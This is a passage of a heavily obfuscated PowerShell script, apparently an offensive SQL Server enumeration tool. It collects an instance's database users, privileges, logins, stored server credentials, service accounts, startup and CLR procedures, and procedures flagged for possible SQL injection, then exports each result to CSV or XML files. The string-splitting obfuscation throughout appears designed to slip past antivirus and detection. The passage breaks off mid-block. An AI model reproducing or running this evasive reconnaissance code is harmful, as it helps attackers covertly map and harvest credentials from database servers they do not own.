            ${OuTp`Ut`path} = "$OutFolder\$OutPutInstance"+("{3}{1}{0}{2}" -f'ses.xm','a','l','_Datab')
            ${rES`UlTS} | &("{0}{2}{1}" -f'E','ort-Clixml','xp') ${ou`TPutp`A`TH}
        }
        else
        {
            ${Outp`U`TPATH} = "$OutFolder\$OutPutInstance"+("{1}{3}{0}{4}{2}" -f'b','_D','ses.csv','ata','a')
            ${ReS`U`Lts} | &("{0}{2}{1}"-f 'E','Csv','xport-') -NoTypeInformation ${OU`TPu`Tpath}
        }

        
        &("{3}{4}{2}{1}{0}" -f 'rbose','e','V','W','rite-') -Message ("$Instance "+'- '+'Ge'+'t'+'ting '+'data'+'b'+'ase '+'us'+'ers '+'for'+' '+'datab'+'ase'+'s...')
        ${RE`s`Ults} = &("{2}{1}{3}{0}" -f'er','-SQLDataba','Get','seUs') -Instance ${I`Nst`ANcE} -Username ${use`RN`AmE} -Password ${pAssw`OrD} -Credential ${CR`ED`ENTIAL} -SuppressVerbose -NoDefaults
        if(${X`mL})
        {
            ${oU`Tput`pA`TH} = "$OutFolder\$OutPutInstance"+("{3}{2}{0}{1}" -f'sers.x','ml','atabase_u','_D')
            ${r`eSU`lTS} | &("{2}{3}{1}{0}"-f 'ml','lix','Ex','port-C') ${oUt`Pu`TPatH}
        }
        else
        {
            ${ou`TPUtP`ATH} = "$OutFolder\$OutPutInstance"+("{1}{4}{3}{2}{0}" -f'_users.csv','_Da','e','s','taba')
            ${rESU`l`TS} | &("{1}{0}{2}"-f't-Cs','Expor','v') -NoTypeInformation ${OU`Tp`UTPath}
        }

        
        &("{3}{2}{4}{0}{1}" -f'os','e','ite-V','Wr','erb') -Message ("$Instance "+'- '+'Get'+'t'+'ing '+'p'+'r'+'ivileges'+' '+'for'+' '+'databa'+'s'+'e'+'s...')
        ${R`eSU`ltS} = &("{3}{2}{0}{1}" -f 'as','ePriv','t-SQLDatab','Ge') -Instance ${I`N`sTanCE} -Username ${Us`erN`Ame} -Password ${pAsS`woRd} -Credential ${CrE`de`Nti`AL} -SuppressVerbose -NoDefaults
        if(${x`ml})
        {
            ${ouTp`Ut`paTh} = "$OutFolder\$OutPutInstance"+("{2}{1}{5}{4}{0}{3}" -f'ileges.','tab','_Da','xml','_priv','ase')
            ${rEsUL`TS} | &("{1}{2}{3}{0}"-f'l','Ex','port-','Clixm') ${ou`T`PUtPa`TH}
        }
        else
        {
            ${oUtpu`Tp`A`Th} = "$OutFolder\$OutPutInstance"+("{0}{5}{4}{2}{6}{1}{3}" -f'_Da','eges','_p','.csv','base','ta','rivil')
            ${rESu`L`TS} | &("{1}{0}{2}" -f 'xp','E','ort-Csv') -NoTypeInformation ${oUTpU`TpA`Th}
        }

        
        &("{1}{0}{2}" -f'Ver','Write-','bose') -Message ("$Instance "+'- '+'G'+'ett'+'ing '+'dat'+'a'+'base '+'r'+'ole'+'s...')
        ${r`e`SuLts} = &("{2}{3}{1}{0}" -f'le','o','Ge','t-SQLDatabaseR') -Instance ${i`N`s`TANce} -Username ${U`serN`A`me} -Password ${p`AsswO`RD} -Credential ${CrE`d`eNTIaL} -SuppressVerbose -NoDefaults
        if(${x`Ml})
        {
            ${oUTpu`TP`ATh} = "$OutFolder\$OutPutInstance"+("{1}{2}{0}{4}{3}"-f't','_D','a','es.xml','abase_rol')
            ${R`esU`lts} | &("{0}{2}{3}{1}" -f 'Expor','xml','t-C','li') ${Out`Pu`TpA`TH}
        }
        else
        {
            ${ouTpu`TPa`TH} = "$OutFolder\$OutPutInstance"+("{0}{2}{1}{3}" -f'_','tabase_roles.','Da','csv')
            ${r`esU`lts} | &("{1}{0}{2}" -f'o','Exp','rt-Csv') -NoTypeInformation ${oUtp`Ut`PatH}
        }

        
        &("{1}{3}{2}{4}{0}"-f'e','Wri','e-Ve','t','rbos') -Message ("$Instance "+'- '+'Ge'+'t'+'ting '+'da'+'ta'+'base '+'ro'+'le '+'m'+'emb'+'e'+'rs...')
        ${r`e`sULTS} = &("{1}{2}{6}{0}{4}{5}{3}{7}" -f'ta','Get-S','QLD','o','ba','seR','a','leMember') -Instance ${i`Ns`TanCE} -Username ${US`eRnA`me} -Password ${p`As`s`WorD} -Credential ${cR`eDE`NtiAL} -SuppressVerbose -NoDefaults
        if(${x`mL})
        {
            ${OU`T`p`UtPaTH} = "$OutFolder\$OutPutInstance"+("{2}{4}{5}{0}{1}{3}"-f'e_role_membe','rs.x','_','ml','D','atabas')
            ${REs`ULTs} | &("{0}{2}{1}"-f 'Expo','ixml','rt-Cl') ${O`UTPu`T`path}
        }
        else
        {
            ${OUTpUt`Pa`Th} = "$OutFolder\$OutPutInstance"+("{0}{1}{4}{2}{3}"-f '_Database_role_me','mbe','.cs','v','rs')
            ${RE`su`lTs} | &("{2}{1}{0}" -f 'v','s','Export-C') -NoTypeInformation ${oU`TpUTpA`TH}
        }

        
        &("{0}{2}{1}" -f'Write-V','bose','er') -Message ("$Instance "+'- '+'Getti'+'ng'+' '+'d'+'atabase '+'schema'+'s'+'...')
        ${RES`UlTs} = &("{1}{0}{2}{3}{4}"-f 'SQ','Get-','LDat','abaseSchem','a') -Instance ${i`NSt`AncE} -Username ${u`SE`RNAME} -Password ${PAS`SWO`Rd} -Credential ${C`RedENt`IaL} -SuppressVerbose -NoDefaults
        if(${x`ML})
        {
            ${oUtp`U`Tp`AtH} = "$OutFolder\$OutPutInstance"+("{0}{6}{3}{2}{4}{5}{1}"-f'_Databas','.xml','sch','_','em','as','e')
            ${resU`L`Ts} | &("{2}{0}{1}"-f'port-Cl','ixml','Ex') ${oUTp`UTP`A`Th}
        }
        else
        {
            ${oUTp`Utp`Ath} = "$OutFolder\$OutPutInstance"+("{1}{3}{6}{4}{0}{2}{5}" -f 'e','_Data','m','base_','h','as.csv','sc')
            ${rES`Ul`Ts} | &("{1}{0}{2}" -f 't-Cs','Expor','v') -NoTypeInformation ${OUtp`UtP`A`TH}
        }

        
        &("{1}{2}{0}"-f 'ose','Write','-Verb') -Message ("$Instance "+'- '+'Getti'+'ng'+' '+'te'+'mp '+'ta'+'bles...')
        ${res`ULTs} = &("{2}{0}{1}" -f'SQLTab','leTemp','Get-') -Instance ${iN`sta`Nce} -Username ${U`sEr`NA`me} -Password ${PAsS`wO`Rd} -Credential ${c`REDEn`TIal} -SuppressVerbose
        if(${x`ml})
        {
            ${o`UTPuT`p`AtH} = "$OutFolder\$OutPutInstance"+("{3}{0}{1}{2}" -f '_t','ables.xm','l','_Server_temp')
            ${r`EsU`ltS} | &("{2}{3}{0}{1}" -f'-Cl','ixml','Expo','rt') ${O`UtPUTp`ATH}
        }
        else
        {
            ${O`UTp`UTPATh} = "$OutFolder\$OutPutInstance"+("{2}{0}{1}{3}{4}"-f 'r_te','mp_','_Serve','tables.cs','v')
            ${re`SUL`Ts} | &("{0}{3}{2}{1}"-f 'E','Csv','port-','x') -NoTypeInformation ${O`Ut`p`UTPaTh}
        }

        
        &("{3}{2}{0}{1}"-f'er','bose','rite-V','W') -Message ("$Instance "+'- '+'Get'+'tin'+'g '+'d'+'atabase'+' '+'tables.'+'..')
        ${rE`s`UlTs} = &("{0}{1}{3}{2}" -f'Ge','t-','QLTable','S') -Instance ${in`sTa`NCe} -Username ${us`ern`AME} -Password ${pAS`S`wORd} -Credential ${CrE`deN`TI`AL} -SuppressVerbose -NoDefaults
        if(${X`ML})
        {
            ${o`UtPU`T`patH} = "$OutFolder\$OutPutInstance"+("{1}{5}{4}{3}{2}{0}"-f'l','_','m','.x','bles','Database_ta')
            ${rE`sUL`TS} | &("{1}{2}{0}"-f 'ml','Export-C','lix') ${oU`Tpu`T`pATH}
        }
        else
        {
            ${Ou`T`PUTpatH} = "$OutFolder\$OutPutInstance"+("{0}{1}{4}{2}{3}" -f '_Da','taba','bles.cs','v','se_ta')
            ${r`eS`ULts} | &("{0}{2}{1}{3}" -f'Expo','Cs','rt-','v') -NoTypeInformation ${Ou`TP`U`TpATh}
        }

        
        &("{2}{1}{0}" -f'e','bos','Write-Ver') -Message ("$Instance "+'- '+'Gettin'+'g '+'database'+' '+'vi'+'ews...')
        ${R`eSuLTS} = &("{3}{0}{1}{2}" -f't','-S','QLView','Ge') -Instance ${iNST`A`NCe} -Username ${u`se`Rname} -Password ${pAss`Wo`Rd} -Credential ${cR`EdeN`Tial} -SuppressVerbose -NoDefaults
        if(${X`ml})
        {
            ${O`UtP`U`TpATh} = "$OutFolder\$OutPutInstance"+("{1}{0}{2}{3}"-f 's.','_Database_view','x','ml')
            ${r`EsULtS} | &("{3}{0}{2}{1}{4}"-f'xp','m','ort-Clix','E','l') ${OuTP`U`TP`AtH}
        }
        else
        {
            ${out`p`Utp`ATH} = "$OutFolder\$OutPutInstance"+("{0}{2}{5}{4}{1}{3}" -f'_Da','s','t','v','.c','abase_views')
            ${Res`ULtS} | &("{1}{0}{2}" -f'xpor','E','t-Csv') -NoTypeInformation ${OUt`p`U`TPAtH}
        }

        
        &("{1}{3}{2}{0}"-f'e','Write-','os','Verb') -Message ("$Instance "+'- '+'G'+'etting'+' '+'d'+'at'+'abase '+'co'+'l'+'umns...')
        ${REsU`L`TS} = &("{0}{2}{1}{3}" -f'G','S','et-','QLColumn') -Instance ${I`Ns`TAn`Ce} -Username ${uSEr`Na`Me} -Password ${pa`SSW`o`Rd} -Credential ${cre`DeNt`IAl} -SuppressVerbose -NoDefaults
        if(${X`ml})
        {
            ${o`UT`puTP`ATh} = "$OutFolder\$OutPutInstance"+("{5}{1}{3}{2}{4}{0}{6}" -f 'olumns.xm','D','as','atab','e_c','_','l')
            ${R`ES`ULtS} | &("{2}{0}{3}{1}" -f 'ort','lixml','Exp','-C') ${o`UTput`p`ATh}
        }
        else
        {
            ${OUT`pu`TP`Ath} = "$OutFolder\$OutPutInstance"+("{4}{1}{2}{0}{3}{5}"-f 's.','tabase_co','lumn','cs','_Da','v')
            ${R`es`Ults} | &("{2}{1}{0}"-f'Csv','rt-','Expo') -NoTypeInformation ${oUTp`U`TPAth}
        }

        
        &("{3}{1}{0}{2}"-f'e-Verb','it','ose','Wr') -Message ("$Instance "+'- '+'G'+'ett'+'ing '+'serv'+'er'+' '+'logins..'+'.')
        ${ReSuL`TS} = &("{3}{2}{0}{1}{4}"-f 'r','verLogi','LSe','Get-SQ','n') -Instance ${I`NsTAn`Ce} -Username ${u`SEr`NAME} -Password ${p`A`sSwOrd} -Credential ${cR`ED`E`NtIal} -SuppressVerbose
        if(${x`mL})
        {
            ${OU`TPutpa`Th} = "$OutFolder\$OutPutInstance"+("{0}{1}{2}{3}"-f'_S','e','rver_logins.xm','l')
            ${reSu`L`TS} | &("{2}{0}{1}" -f'ort-C','lixml','Exp') ${out`P`UTpATh}
        }
        else
        {
            ${o`UTPUT`PaTh} = "$OutFolder\$OutPutInstance"+("{0}{2}{3}{4}{1}" -f '_Serve','sv','r_l','og','ins.c')
            ${Res`Ul`Ts} | &("{3}{0}{2}{1}"-f 'po','t-Csv','r','Ex') -NoTypeInformation ${O`U`TPuTpA`Th}
        }

        
        &("{2}{0}{3}{1}"-f 'Ve','bose','Write-','r') -Message ("$Instance "+'- '+'Gettin'+'g '+'ser'+'ver'+' '+'c'+'o'+'nf'+'igu'+'ration '+'s'+'et'+'ti'+'ngs...')
        ${rESu`l`TS} = &("{3}{6}{1}{2}{5}{0}{4}" -f 'ur','rver','Co','Get-','ation','nfig','SQLSe') -Instance ${Ins`T`A`NcE} -Username ${uS`ErN`AME} -Password ${pASsw`o`RD} -Credential ${C`RedenT`iaL} -SuppressVerbose
        if(${x`ML})
        {
            ${O`UtpUt`pATh} = "$OutFolder\$OutPutInstance"+("{3}{0}{5}{6}{1}{2}{4}" -f'rver_','urat','i','_Se','on.xml','c','onfig')
            ${Res`Ul`Ts} | &("{0}{2}{3}{1}"-f 'Ex','lixml','port','-C') ${oU`TPUTpa`TH}
        }
        else
        {
            ${O`UtPUT`p`ATh} = "$OutFolder\$OutPutInstance"+("{6}{3}{1}{5}{4}{0}{2}"-f'n.','onf','csv','erver_c','atio','igur','_S')
            ${R`eS`ULts} | &("{1}{2}{0}" -f'sv','Ex','port-C') -NoTypeInformation ${ou`TPut`Path}
        }

        
        &("{0}{2}{3}{1}"-f'W','bose','rite-Ve','r') -Message ("$Instance "+'- '+'Get'+'tin'+'g '+'s'+'erve'+'r '+'privil'+'e'+'ge'+'s...')
        ${Res`UlTS} = &("{2}{1}{0}{3}"-f 'Serve','et-SQL','G','rPriv') -Instance ${in`s`TAnce} -Username ${use`R`Name} -Password ${p`As`sWO`RD} -Credential ${C`REdENTi`Al} -SuppressVerbose
        if(${x`ml})
        {
            ${o`UT`pu`TpAth} = "$OutFolder\$OutPutInstance"+("{2}{4}{3}{0}{1}"-f 's','.xml','_Ser','er_privilege','v')
            ${r`ESu`lts} | &("{3}{1}{2}{0}" -f'l','rt-Cli','xm','Expo') ${OutpU`Tpa`TH}
        }
        else
        {
            ${ou`TpU`TPAth} = "$OutFolder\$OutPutInstance"+("{2}{3}{0}{4}{1}"-f 'r','eges.csv','_','Server_p','ivil')
            ${R`E`sUlTS} | &("{1}{0}{2}" -f 'ort-Cs','Exp','v') -NoTypeInformation ${outP`UTp`ATH}
        }

        
        &("{0}{1}{2}" -f'Writ','e-Verbo','se') -Message ("$Instance "+'- '+'Get'+'ting'+' '+'se'+'rve'+'r '+'role'+'s'+'...')
        ${REs`UlTs} = &("{1}{2}{0}{3}{4}"-f 'Q','Get','-S','LServerRol','e') -Instance ${INs`T`ANCe} -Username ${u`S`ERNaMe} -Password ${PAS`swO`Rd} -Credential ${c`Re`d`ENTIAL} -SuppressVerbose
        if(${X`mL})
        {
            ${oU`Tp`UTpATh} = "$OutFolder\$OutPutInstance"+("{1}{2}{3}{0}{4}"-f 'oles','_S','er','ver_r','.xml')
            ${Re`s`ULtS} | &("{1}{2}{0}"-f 'ixml','Export-C','l') ${Ou`Tp`U`TpATH}
        }
        else
        {
            ${O`UTP`UtP`ATh} = "$OutFolder\$OutPutInstance"+("{3}{2}{1}{0}"-f 'sv','s.c','e','_Server_rol')
            ${R`EsUlTs} | &("{0}{2}{1}"-f 'E','rt-Csv','xpo') -NoTypeInformation ${OuTp`U`TPaTH}
        }

        
        &("{3}{0}{2}{1}"-f'rite-','erbose','V','W') -Message ("$Instance "+'- '+'Ge'+'tting '+'s'+'erver '+'ro'+'le '+'members'+'..'+'.')
        ${Res`UlTs} = &("{6}{1}{5}{4}{3}{0}{2}"-f 'Membe','-SQLS','r','e','Rol','erver','Get') -Instance ${iNsT`AN`CE} -Username ${US`er`Na`me} -Password ${PA`sswoRD} -Credential ${cre`dE`Nt`IAL} -SuppressVerbose
        if(${x`mL})
        {
            ${Ou`Tpu`TPA`Th} = "$OutFolder\$OutPutInstance"+("{1}{3}{0}{2}{4}"-f'.','_Server_roleme','xm','mbers','l')
            ${res`ULts} | &("{0}{2}{1}" -f'Exp','xml','ort-Cli') ${OU`TPUTp`AtH}
        }
        else
        {
            ${oUT`P`UTPAth} = "$OutFolder\$OutPutInstance"+("{2}{3}{5}{1}{4}{0}" -f'mbers.csv','lem','_Ser','ver','e','_ro')
            ${re`SU`LTs} | &("{0}{2}{1}"-f'Expo','v','rt-Cs') -NoTypeInformation ${ouTpUt`p`ATh}
        }

        
        &("{2}{1}{0}"-f'e','bos','Write-Ver') -Message ("$Instance "+'- '+'Getti'+'ng'+' '+'se'+'rver'+' '+'cr'+'edential'+'s...')
        ${R`EsU`lTs} = &("{3}{0}{2}{1}{4}" -f 'et','verCredenti','-SQLSer','G','al') -Instance ${I`N`sTaNCe} -Username ${US`ER`NAme} -Password ${PAS`S`woRD} -Credential ${cRed`EntI`AL} -SuppressVerbose
        if(${x`ml})
        {
            ${OU`TPut`p`ATH} = "$OutFolder\$OutPutInstance"+("{1}{4}{0}{3}{2}"-f'reden','_','ls.xml','tia','Server_c')
            ${R`eSU`Lts} | &("{0}{1}{2}"-f 'Ex','port-Clixm','l') ${oUtp`U`TPA`TH}
        }
        else
        {
            ${oUT`PU`TPAtH} = "$OutFolder\$OutPutInstance"+("{5}{6}{3}{4}{0}{2}{1}"-f'.','v','cs','den','tials','_Server_c','re')
            ${resuL`TS} | &("{2}{1}{0}"-f 't-Csv','or','Exp') -NoTypeInformation ${ouTp`U`TPa`TH}
        }

        
        &("{2}{1}{4}{3}{0}" -f'bose','t','Wri','r','e-Ve') -Message ("$Instance "+'- '+'Getti'+'ng '+'SQ'+'L '+'S'+'er'+'ver '+'servi'+'c'+'e '+'a'+'ccoun'+'ts...')
        ${R`EsuL`Ts} = &("{5}{4}{3}{1}{2}{0}" -f 'unt','eAc','co','Servic','QL','Get-S') -Instance ${I`Nst`ANcE} -Username ${u`Se`RNaME} -Password ${pA`SSW`ORd} -Credential ${Cr`EDEnTi`AL} -SuppressVerbose
        if(${X`ml})
        {
            ${OUT`Putp`AtH} = "$OutFolder\$OutPutInstance"+("{0}{6}{1}{2}{5}{4}{3}"-f '_','vice_a','c','.xml','nts','cou','Ser')
            ${r`ES`ULts} | &("{2}{4}{1}{0}{3}"-f'xm','-Cli','Ex','l','port') ${out`p`U`TpATh}
        }
        else
        {
            ${oU`TpUTP`ATh} = "$OutFolder\$OutPutInstance"+("{4}{1}{3}{5}{2}{0}"-f'sv','ce_acc','c','ou','_Servi','nts.')
            ${R`ESulTs} | &("{1}{2}{0}"-f 'v','Ex','port-Cs') -NoTypeInformation ${OUtPU`TpA`TH}
        }

        
        &("{1}{3}{0}{2}"-f'-Verbos','W','e','rite') -Message ("$Instance "+'- '+'Getti'+'n'+'g '+'store'+'d '+'proc'+'e'+'du'+'res.'+'..')
        ${re`sUl`Ts} = &("{0}{1}{2}{4}{3}" -f'G','et-SQLS','toredP','ure','roced') -Instance ${IN`St`AnCe} -Username ${uSEr`NAMe} -Password ${p`AssWo`RD} -Credential ${cR`eD`eNTIaL} -SuppressVerbose
        if(${x`ml})
        {
            ${Ou`T`pu`TPaTh} = "$OutFolder\$OutPutInstance"+("{6}{0}{1}{2}{4}{7}{3}{5}"-f'atabas','e','_','rocedure.','stored_','xml','_D','p')
            ${r`EsuL`Ts} | &("{0}{1}{2}" -f'Export-Cli','x','ml') ${ou`T`putPaTh}
        }
        else
        {
            ${o`Utpu`Tpa`TH} = "$OutFolder\$OutPutInstance"+("{5}{3}{1}{4}{0}{2}{7}{6}"-f 'sto','abase','red_procedure','t','_','_Da','v','.cs')
            ${RES`Ul`TS} | &("{0}{1}{2}"-f 'E','xport-Cs','v') -NoTypeInformation ${oU`TP`UtPA`TH}
        }


        
        &("{2}{1}{0}" -f 'rbose','Ve','Write-') -Message ("$Instance "+'- '+'Ge'+'tt'+'ing '+'s'+'tored'+' '+'pr'+'o'+'cedure'+'s '+'that'+' '+'u'+'se '+'glo'+'bal '+'temp'+' '+'tables'+'.'+'..')
        ${Res`UL`Ts} = &("{4}{2}{3}{0}{1}"-f 'ur','e','t-SQLStoredPr','oced','Ge') -Instance ${insT`AncE} -Username ${use`RN`A`ME} -Password ${pAs`sW`orD} -Credential ${cRed`E`NTIAL} -SuppressVerbose | &("{0}{1}" -f 'w','here') ("{0}{4}{3}{1}{2}"-f 'Pr','reDef','inition','cedu','o') -like ("{1}{0}" -f'#*','*#')
        if(${x`ML})
        {
            ${out`puTpA`TH} = "$OutFolder\$OutPutInstance"+("{7}{5}{3}{0}{4}{8}{6}{2}{1}{9}"-f'oc','x','lobaltmptbl.','_stored_pr','edu','ase','g','_Datab','re_','ml')
            ${Res`U`LTs} | &("{2}{1}{0}{3}"-f'ix','ort-Cl','Exp','ml') ${out`PutPA`TH}
        }
        else
        {
            ${oUt`pUTPa`Th} = "$OutFolder\$OutPutInstance"+("{1}{0}{11}{8}{6}{9}{4}{7}{5}{10}{3}{2}"-f'atab','_D','l.csv','tmptb','e_g','oba','cedu','l','_stored_pro','r','l','ase')
            ${reS`UltS} | &("{1}{0}{2}{3}"-f'xp','E','ort','-Csv') -NoTypeInformation ${Outp`UTpa`TH}
        }

        
        &("{1}{3}{4}{2}{0}"-f 'e','Wri','os','te-V','erb') -Message ("$Instance "+'- '+'Ge'+'tting'+' '+'custo'+'m '+'extende'+'d '+'s'+'tored '+'pr'+'o'+'ced'+'ures...')
        ${re`s`UlTS} = &("{2}{1}{3}{5}{4}{0}"-f'XP','LStoredProc','Get-SQ','e','re','du') -Instance ${IN`StA`NcE} -Username ${uSer`NA`Me} -Password ${pa`sS`WORd} -Credential ${crED`e`N`TIal} -SuppressVerbose
        if(${x`ml})
        {
            ${oUT`PUtpA`TH} = "$OutFolder\$OutPutInstance"+("{8}{3}{4}{0}{5}{1}{6}{2}{7}"-f'ase','tor','x','at','ab','_s','ed_procedure_xp.','ml','_D')
            ${R`ESultS} | &("{1}{0}{3}{2}" -f'po','Ex','ixml','rt-Cl') ${oU`TpuT`PAth}
        }
        else
        {
            ${Out`P`UtpaTH} = "$OutFolder\$OutPutInstance"+("{3}{2}{1}{6}{5}{4}{9}{7}{8}{0}"-f'xp.csv','se_','ataba','_D','c','tored_pro','s','ur','e_','ed')
            ${reSu`lTS} | &("{2}{0}{1}"-f'xpo','rt-Csv','E') -NoTypeInformation ${Out`pU`TP`Ath}
        }

        
        &("{0}{3}{1}{4}{2}" -f 'Wri','e-','ose','t','Verb') -Message ("$Instance "+'- '+'Gett'+'ing'+' '+'server'+' '+'pol'+'i'+'cies.'+'..')
        ${Res`UL`Ts} = &("{4}{2}{1}{3}{5}{0}" -f'licy','Serv','L','erP','Get-SQ','o') -Instance ${I`NSTAn`CE} -Username ${Use`R`NAmE} -Password ${p`A`ssWorD} -Credential ${c`REDE`NtiAL} -SuppressVerbose
        if(${x`Ml})
        {
            ${oU`Tpu`TPatH} = "$OutFolder\$OutPutInstance"+("{2}{1}{3}{0}" -f'y.xml','poli','_Server_','c')
            ${rEsU`L`Ts} | &("{3}{1}{4}{0}{2}" -f'-C','o','lixml','Exp','rt') ${OU`TP`UtpaTH}
        }
        else
        {
            ${OuTp`UtPa`Th} = "$OutFolder\$OutPutInstance"+("{3}{0}{1}{2}" -f 'erver_p','oli','cy.csv','_S')
            ${R`E`suLTs} | &("{1}{0}{2}"-f 'port','Ex','-Csv') -NoTypeInformation ${ou`T`pUt`pAth}
        }

        
        &("{3}{2}{1}{0}" -f'bose','er','rite-V','W') -Message ("$Instance "+'- '+'G'+'ett'+'ing '+'stored'+' '+'pr'+'ocedu'+'res '+'with'+' '+'po'+'tent'+'ia'+'l '+'S'+'QL '+'In'+'jection.'+'..')
        ${RE`sULTs} = &("{4}{0}{3}{1}{2}" -f'LSt','e','dProcedureSQLi','or','Get-SQ') -Instance ${I`Ns`TaNce} -Username ${USern`A`Me} -Password ${pAs`Sw`ORd} -Credential ${CRE`de`Nt`IAl} -SuppressVerbose
        if(${x`mL})
        {
            ${O`UtpUTP`Ath} = "$OutFolder\$OutPutInstance"+("{5}{1}{0}{6}{3}{2}{4}"-f 'ase_s','Datab','pr','red_','ocedure_sqli.xml','_','to')
            ${REs`Ul`TS} | &("{0}{1}{2}"-f'Export-','C','lixml') ${oUTp`U`TpaTh}
        }
        else
        {
            ${oU`T`putPAtH} = "$OutFolder\$OutPutInstance"+("{3}{4}{5}{2}{0}{1}"-f're_sq','li.csv','procedu','_Datab','ase_stored','_')
            ${r`ES`ULTS} | &("{1}{0}{2}"-f 'port-','Ex','Csv') -NoTypeInformation ${ou`TpuT`PA`Th}
        }

        
        &("{1}{0}{2}{3}"-f'rite','W','-Verb','ose') -Message ("$Instance "+'- '+'Get'+'ting '+'sta'+'rt'+'up '+'st'+'ored '+'pro'+'ce'+'du'+'r'+'es...')
        ${res`Ul`Ts} = &("{0}{2}{5}{3}{6}{4}{1}{7}"-f 'Get','Procedu','-SQL','t','ed','S','or','reAutoExec') -Instance ${ins`TANcE} -Username ${uSe`RNa`me} -Password ${paSSW`O`Rd} -Credential ${crE`dEN`TiAl} -SuppressVerbose
        if(${X`Ml})
        {
            ${o`UTP`Utpath} = "$OutFolder\$OutPutInstance"+("{6}{4}{1}{5}{10}{9}{0}{2}{8}{3}{7}"-f 're','t','_','tart','Da','abase_s','_','up.xml','s','ored_procedu','t')
            ${r`esU`Lts} | &("{0}{2}{1}{3}" -f 'Exp','Clix','ort-','ml') ${O`UtpuT`paTH}
        }
        else
        {
            ${Ou`Tput`pa`TH} = "$OutFolder\$OutPutInstance"+("{1}{6}{10}{7}{8}{9}{3}{4}{2}{0}{5}" -f 'up.cs','_D','t','cedure_','star','v','a','base_store','d','_pro','ta')
            ${Re`sUL`TS} | &("{1}{2}{0}"-f 'sv','Exp','ort-C') -NoTypeInformation ${OuT`p`UtPATh}
        }

        
        &("{3}{1}{2}{0}"-f'rbose','it','e-Ve','Wr') -Message ("$Instance "+'- '+'Ge'+'t'+'ting '+'CL'+'R '+'s'+'tored '+'p'+'r'+'ocedur'+'es...')
        ${reSU`l`TS} = &("{5}{3}{2}{4}{1}{0}"-f 'eCLR','ocedur','SQL','t-','StoredPr','Ge') -Instance ${i`NSTaN`Ce} -Username ${USe`RN`AME} -Password ${pA`s`swoRd} -Credential ${cre`dE`N`TiAL} -SuppressVerbose
        if(${x`ml})
        {
            ${oUTPUtP`A`Th} = "$OutFolder\$OutPutInstance"+("{4}{1}{2}{3}{6}{7}{5}{0}" -f'xml','atab','ase_stor','ed_p','_D','edure_clr.','r','oc')
            ${RESu`L`Ts} | &("{2}{0}{1}"-f'xport-Clix','ml','E') ${oU`Tp`UTP`AtH}
        }
        else
        {
            ${O`U`TpUtPath} = "$OutFolder\$OutPutInstance"+("{5}{4}{3}{2}{0}{1}"-f's','v','lr.c','ored_procedure_c','se_st','_Databa')
            ${r`ESUltS} | &("{0}{2}{1}" -f'Expor','v','t-Cs') -NoTypeInformation ${O`U`TP`UtPatH}
        }

        
        &("{3}{2}{1}{0}" -f'bose','Ver','ite-','Wr') -Message ("$Instance "+'- '+'G'+'ettin'+'g '+'DML'+' '+'tr'+'igger'+'s'+'...')
        ${rE`sUlTs} = &("{2}{4}{1}{3}{5}{0}" -f 'l','gg','G','e','et-SQLTri','rDm') -Instance ${in`St`ANCE} -Username ${u`s`ErNA`Me} -Password ${PaSs`WO`Rd} -Credential ${Cr`EdEn`TIal} -SuppressVerbose
        if(${X`mL})
        {
            ${oU`Tp`UtPA`TH} = "$OutFolder\$OutPutInstance"+("{6}{4}{0}{2}{5}{1}{3}" -f'rve','riggers_','r_','dml.xml','e','t','_S')
            ${Re`SU`lTS} | &("{2}{0}{1}" -f'Cli','xml','Export-') ${Ou`T`PutPA`Th}
        }
        else
        {
            ${Ou`T`Put`pAth} = "$OutFolder\$OutPutInstance"+("{4}{2}{3}{0}{1}"-f'gg','ers_dml.csv','erver_tr','i','_S')
            ${r`Es`ULtS} | &("{0}{1}{2}"-f 'Exp','o','rt-Csv') -NoTypeInformation ${Outp`UtP`ATh}
        }

        
        &("{0}{2}{1}" -f'Write','rbose','-Ve') -Message ("$Instance "+'- '+'Get'+'ting'+' '+'D'+'ML '+'tri'+'gg'+'er'+'s '+'t'+'hat '+'use'+' '+'g'+'lo'+'bal '+'tem'+'p '+'tabl'+'es'+'...')
        ${rEsu`LTs} = &("{1}{2}{3}{4}{0}" -f 'rDml','Get','-SQLT','rigg','e') -Instance ${i`NstAN`Ce} -Username ${UsE`Rn`Ame} -Password ${pa`sS`wORd} -Credential ${C`ReDE`NTIAL} -SuppressVerbose | &("{0}{1}"-f'wher','e') ("{3}{2}{1}{0}{4}" -f'nitio','i','ef','TriggerD','n') -like ("{1}{0}" -f'##*','*')
        if(${x`Ml})
        {
            ${ouTPutP`A`TH} = "$OutFolder\$OutPutInstance"+("{3}{4}{0}{7}{5}{1}{6}{2}{8}"-f 'er_trigger','baltmp','l.x','_S','erv','lo','tb','s_dml_g','ml')
            ${r`eS`ULTS} | &("{0}{1}{2}"-f 'Expor','t','-Clixml') ${oUTP`U`Tpa`TH}
        }
        else
        {
            ${oU`TP`U`TPath} = "$OutFolder\$OutPutInstance"+("{3}{1}{7}{5}{2}{9}{8}{10}{4}{6}{0}"-f'sv','e','rigg','_S','ltmp','t','tbl.c','rver_','gl','ers_dml_','oba')
            ${r`Esu`Lts} | &("{1}{0}{2}" -f'ort','Exp','-Csv') -NoTypeInformation ${oU`T`putpA`TH}
        }

        
        &("{2}{1}{3}{0}"-f '-Verbose','it','Wr','e') -Message ("$Instance "+'- '+'Getting'+' '+'DDL'+' '+'tr'+'igge'+'rs...')
        ${R`esUl`Ts} = &("{1}{3}{0}{2}" -f'erDd','Get-SQLTri','l','gg') -Instance ${inSTA`NCE} -Username ${Use`RnA`Me} -Password ${pa`SSw`orD} -Credential ${cR`e`deNtIAL} -SuppressVerbose
        if(${X`ml})
        {
            ${Ou`T`pUTPA`Th} = "$OutFolder\$OutPutInstance"+("{1}{4}{2}{5}{3}{0}"-f 'ddl.xml','_','_tr','gers_','Server','ig')
            ${Re`S`ULts} | &("{1}{2}{0}"-f 'Clixml','Expo','rt-') ${Out`P`U`TpatH}
        }
        else
        {
            ${o`UtPUtPA`TH} = "$OutFolder\$OutPutInstance"+("{3}{2}{4}{0}{1}" -f 'e','rs_ddl.csv','r_t','_Serve','rigg')
            ${RE`S`Ults} | &("{0}{2}{1}"-f 'Export-','sv','C') -NoTypeInformation ${ouTP`UT`pA`Th}
        }

        
        &("{2}{0}{1}"-f 'rite-Ve','rbose','W') -Message ("$Instance "+'- '+'Get'+'ting'+' '+'DDL'+' '+'t'+'ri'+'ggers '+'th'+'at '+'us'+'e '+'gl'+'oba'+'l '+'temp'+' '+'t'+'abl'+'es...')
